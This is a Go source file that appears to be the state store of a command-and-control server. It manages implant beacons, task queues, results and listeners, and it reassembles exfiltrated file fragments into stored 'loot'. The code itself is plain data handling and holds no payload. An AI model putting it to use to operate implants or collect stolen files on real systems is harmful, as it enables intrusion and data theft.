package store

import (
	"context"
	"sort"
	"sync"
	"time"

	"c2/models"
)

type exfilFragment struct {
	Identifier uint32
	Data       []byte
}

type exfilState struct {
	Filename  string
	Fragments []exfilFragment
	CreatedAt time.Time
}

type Store struct {
	mu             sync.RWMutex
	beacons        map[uint32]*models.Beacon
	tasks          map[uint32][]*models.Task
	results        map[uint32][]*models.Result
	listeners      map[uint32]*models.Listener
	listenerSeq    uint32
	exfilFragments map[uint32]*exfilState
	exfilFiles     map[uint32]*models.ExfilEntry
	events         []*models.Event
	terminals      map[uint32]*models.TerminalState
}

func New() *Store {
	return &Store{
		beacons:        make(map[uint32]*models.Beacon),
		tasks:          make(map[uint32][]*models.Task),
		results:        make(map[uint32][]*models.Result),
		listeners:      make(map[uint32]*models.Listener),
		exfilFragments: make(map[uint32]*exfilState),
		exfilFiles:     make(map[uint32]*models.ExfilEntry),
		terminals:      make(map[uint32]*models.TerminalState),
	}
}

func (s *Store) RegisterBeacon(meta *models.ImplantMetadata) bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	if _, exists := s.beacons[meta.ID]; exists {
		return false
	}
	now := time.Now()
	s.beacons[meta.ID] = &models.Beacon{
		ImplantMetadata: *meta,
		FirstSeen:       now,
		LastSeen:        now,
	}
	return true
}

// GetBeacon returns a snapshot copy of the beacon to avoid aliasing with
// internal state mutated by UpdateLastSeen and RegisterBeacon.
func (s *Store) GetBeacon(id uint32) *models.Beacon {
	s.mu.RLock()
	defer s.mu.RUnlock()
	b, ok := s.beacons[id]
	if !ok {
		return nil
	}
	snapshot := *b
	return &snapshot
}

func (s *Store) UpdateLastSeen(id uint32) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if b, ok := s.beacons[id]; ok {
		b.LastSeen = time.Now()
	}
}

func (s *Store) UpdateBeaconSleep(id, sleep, jitter uint32) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if b, ok := s.beacons[id]; ok {
		b.Sleep = sleep
		b.Jitter = jitter
	}
}

func (s *Store) QueueTask(t *models.Task) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.tasks[t.BeaconID] = append(s.tasks[t.BeaconID], t)
}

func (s *Store) GetNextTask(beaconID uint32) *models.Task {
	s.mu.Lock()
	defer s.mu.Unlock()
	for _, t := range s.tasks[beaconID] {
		if t.Status == models.TaskStatusPending {
			t.Status = models.TaskStatusSent
			return t
		}
	}
	return nil
}

func (s *Store) DrainPendingTasks(beaconID uint32) []*models.Task {
	s.mu.Lock()
	defer s.mu.Unlock()
	var out []*models.Task
	for _, t := range s.tasks[beaconID] {
		if t.Status == models.TaskStatusPending {
			t.Status = models.TaskStatusSent
			out = append(out, t)
			if len(out) >= 32 {
				break
			}
		}
	}
	return out
}

func (s *Store) ListBeacons() []*models.Beacon {
	s.mu.RLock()
	defer s.mu.RUnlock()
	out := make([]*models.Beacon, 0, len(s.beacons))
	for _, b := range s.beacons {
		snapshot := *b
		out = append(out, &snapshot)
	}
	return out
}

func (s *Store) StoreResult(r *models.Result) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.results[r.BeaconID] = append(s.results[r.BeaconID], r)
}

func (s *Store) GetResults(beaconID uint32) []*models.Result {
	s.mu.RLock()
	defer s.mu.RUnlock()
	src := s.results[beaconID]
	out := make([]*models.Result, len(src))
	copy(out, src)
	return out
}

func (s *Store) GetResultsSince(beaconID uint32, since int64) []*models.Result {
	s.mu.RLock()
	defer s.mu.RUnlock()
	var out []*models.Result
	for _, r := range s.results[beaconID] {
		if r.ReceivedAt.Unix() > since {
			out = append(out, r)
		}
	}
	return out
}

func (s *Store) MarkTaskDone(label uint32) {
	s.mu.Lock()
	defer s.mu.Unlock()
	for _, tasks := range s.tasks {
		for _, t := range tasks {
			if t.Label == label {
				t.Status = models.TaskStatusCompleted
				return
			}
		}
	}
}

// DeleteBeacon removes a beacon and all associated tasks and results.
func (s *Store) DeleteBeacon(id uint32) {
	s.mu.Lock()
	defer s.mu.Unlock()
	delete(s.beacons, id)
	delete(s.tasks, id)
	delete(s.results, id)
}

// AddListener assigns a unique ID to l and stores it.
func (s *Store) AddListener(l *models.Listener) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.listenerSeq++
	l.ID = s.listenerSeq
	s.listeners[l.ID] = l
}

// GetListener returns the listener with the given ID, or nil.
func (s *Store) GetListener(id uint32) *models.Listener {
	s.mu.RLock()
	defer s.mu.RUnlock()
	l, ok := s.listeners[id]
	if !ok {
		return nil
	}
	snapshot := *l
	return &snapshot
}

// ListListeners returns all listeners in insertion order.
func (s *Store) ListListeners() []*models.Listener {
	s.mu.RLock()
	defer s.mu.RUnlock()
	out := make([]*models.Listener, 0, len(s.listeners))
	for i := uint32(1); i <= s.listenerSeq; i++ {
		if l, ok := s.listeners[i]; ok {
			out = append(out, l)
		}
	}
	return out
}

// PortInUse returns true if any stored listener is already using port.
func (s *Store) PortInUse(port int) bool {
	s.mu.RLock()
	defer s.mu.RUnlock()
	for _, l := range s.listeners {
		if l.Port == port {
			return true
		}
	}
	return false
}

// RemoveListener deletes the listener with the given ID.
func (s *Store) RemoveListener(id uint32) {
	s.mu.Lock()
	defer s.mu.Unlock()
	delete(s.listeners, id)
}

// AllResults returns a snapshot copy of all results indexed by beacon ID.
func (s *Store) AllResults() map[uint32][]*models.Result {
	s.mu.RLock()
	defer s.mu.RUnlock()
	out := make(map[uint32][]*models.Result, len(s.results))
	for id, rs := range s.results {
		cp := make([]*models.Result, len(rs))
		for i, r := range rs {
			snapshot := *r
			cp[i] = &snapshot
		}
		out[id] = cp
	}
	return out
}

// LoadBeacons inserts beacons directly without touching tasks or results.
// Used only at startup to restore a saved session.
func (s *Store) LoadBeacons(bs []*models.Beacon) {
	s.mu.Lock()
	defer s.mu.Unlock()
	for _, b := range bs {
		s.beacons[b.ID] = b
	}
}

// LoadListeners inserts listeners directly and advances listenerSeq to max(ID).
// Used only at startup to restore a saved session.
func (s *Store) LoadListeners(ls []*models.Listener) {
	s.mu.Lock()
	defer s.mu.Unlock()
	var maxID uint32
	for _, l := range ls {
		s.listeners[l.ID] = l
		if l.ID > maxID {
			maxID = l.ID
		}
	}
	s.listenerSeq = maxID
}

// LoadResults inserts result slices directly.
// Used only at startup to restore a saved session.
func (s *Store) LoadResults(rs map[uint32][]*models.Result) {
	s.mu.Lock()
	defer s.mu.Unlock()
	for id, slice := range rs {
		s.results[id] = slice
	}
}

// AddExfilFragment accumulates one incoming exfil fragment.
// Fragment 0 must carry [uint16 name_len][name bytes][chunk bytes].
// Subsequent fragments carry only [chunk bytes].
// Returns (done, filename, assembledData) when last fragment arrives (Flags & 8 != 0).
// Returns (false, "", nil) otherwise.
func (s *Store) AddExfilFragment(label, identifier uint32, flags uint16, raw []byte) (bool, string, []byte) {
	s.mu.Lock()
	defer s.mu.Unlock()

	state, ok := s.exfilFragments[label]
	if !ok {
		state = &exfilState{CreatedAt: time.Now()}
		s.exfilFragments[label] = state
	}

	const maxFragments = 16384
	const maxExfilSize = 100 * 1024 * 1024

	chunkData := raw
	if identifier == 0 && len(raw) >= 2 {
		nameLen := uint16(raw[0]) | uint16(raw[1])<<8
		if int(nameLen)+2 <= len(raw) {
			state.Filename = string(raw[2 : 2+nameLen])
			chunkData = raw[2+nameLen:]
		}
	}

	if len(state.Fragments) >= maxFragments {
		delete(s.exfilFragments, label)
		return false, "", nil
	}

	var totalSize int
	for _, f := range state.Fragments {
		totalSize += len(f.Data)
	}
	if totalSize+len(chunkData) > maxExfilSize {
		delete(s.exfilFragments, label)
		return false, "", nil
	}

	for _, f := range state.Fragments {
		if f.Identifier == identifier {
			return false, "", nil
		}
	}

	cp := make([]byte, len(chunkData))
	copy(cp, chunkData)
	state.Fragments = append(state.Fragments, exfilFragment{Identifier: identifier, Data: cp})

	if flags&8 == 0 {
		return false, "", nil
	}

	sort.Slice(state.Fragments, func(i, j int) bool {
		return state.Fragments[i].Identifier < state.Fragments[j].Identifier
	})
	var assembled []byte
	for _, f := range state.Fragments {
		assembled = append(assembled, f.Data...)
	}
	name := state.Filename
	delete(s.exfilFragments, label)
	return true, name, assembled
}

// MarkExfilDone stores metadata for a completed exfil file.
func (s *Store) MarkExfilDone(label uint32, filename string, beaconID uint32, size int64) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.exfilFiles[label] = &models.ExfilEntry{
		Label:    label,
		Filename: filename,
		BeaconID: beaconID,
		Size:     size,
		ExfilAt:  time.Now(),
	}
}

func (s *Store) ListExfilFiles() []*models.ExfilEntry {
	s.mu.RLock()
	defer s.mu.RUnlock()
	out := make([]*models.ExfilEntry, 0, len(s.exfilFiles))
	for _, e := range s.exfilFiles {
		cp := *e
		out = append(out, &cp)
	}
	return out
}

// GetExfilFile returns the ExfilEntry for label, or nil.
func (s *Store) GetExfilFile(label uint32) *models.ExfilEntry {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.exfilFiles[label]
}

// DeleteExfilFile removes the exfil entry from the store.
func (s *Store) DeleteExfilFile(label uint32) {
	s.mu.Lock()
	defer s.mu.Unlock()
	delete(s.exfilFiles, label)
}

// LoadLoot restores exfil entries (used at startup).
func (s *Store) LoadLoot(files []*models.ExfilEntry) {
	s.mu.Lock()
	defer s.mu.Unlock()
	for _, f := range files {
		s.exfilFiles[f.Label] = f
	}
}

// AddEvent appends an event to the log (capped at maxEvents).
func (s *Store) AddEvent(e *models.Event) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.addEventCapped(e)
}

// StartPruner launches a background goroutine that periodically cleans
// abandoned exfil uploads. Stops when ctx is cancelled.
func (s *Store) StartPruner(ctx context.Context) {
	go func() {
		ticker := time.NewTicker(pruneInterval)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				s.PruneStaleExfil()
			}
		}
	}()
}

// ListEvents returns all events.
func (s *Store) ListEvents() []*models.Event {
	s.mu.RLock()
	defer s.mu.RUnlock()
	out := make([]*models.Event, len(s.events))
	copy(out, s.events)
	return out
}

// GetTerminal returns the terminal state for a beacon.
func (s *Store) GetTerminal(id uint32) *models.TerminalState {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.terminals[id]
}

// SetTerminal saves terminal state for a beacon.
func (s *Store) SetTerminal(id uint32, state *models.TerminalState) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.terminals[id] = state
}

// ListTerminals returns all terminal states.
func (s *Store) ListTerminals() map[uint32]*models.TerminalState {
	s.mu.RLock()
	defer s.mu.RUnlock()
	out := make(map[uint32]*models.TerminalState, len(s.terminals))
	for k, v := range s.terminals {
		out[k] = v
	}
	return out
}

// LoadTerminals replaces all terminal states (used at startup).
func (s *Store) LoadTerminals(ts map[uint32]*models.TerminalState) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.terminals = ts
}

// LoadEvents replaces the event log (used at startup from persistence).
func (s *Store) LoadEvents(evts []*models.Event) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.events = evts
}

const maxEvents = 1000
const exfilTTL = 10 * time.Minute
const pruneInterval = 2 * time.Minute

// PruneStaleExfil removes partial exfil uploads older than exfilTTL.
func (s *Store) PruneStaleExfil() int {
	s.mu.Lock()
	defer s.mu.Unlock()
	cutoff := time.Now().Add(-exfilTTL)
	pruned := 0
	for label, state := range s.exfilFragments {
		if state.CreatedAt.Before(cutoff) {
			delete(s.exfilFragments, label)
			pruned++
		}
	}
	return pruned
}

// AddEvent appends an event and trims oldest if over cap.
func (s *Store) addEventCapped(e *models.Event) {
	s.events = append(s.events, e)
	if len(s.events) > maxEvents {
		s.events = s.events[len(s.events)-maxEvents:]
	}
}
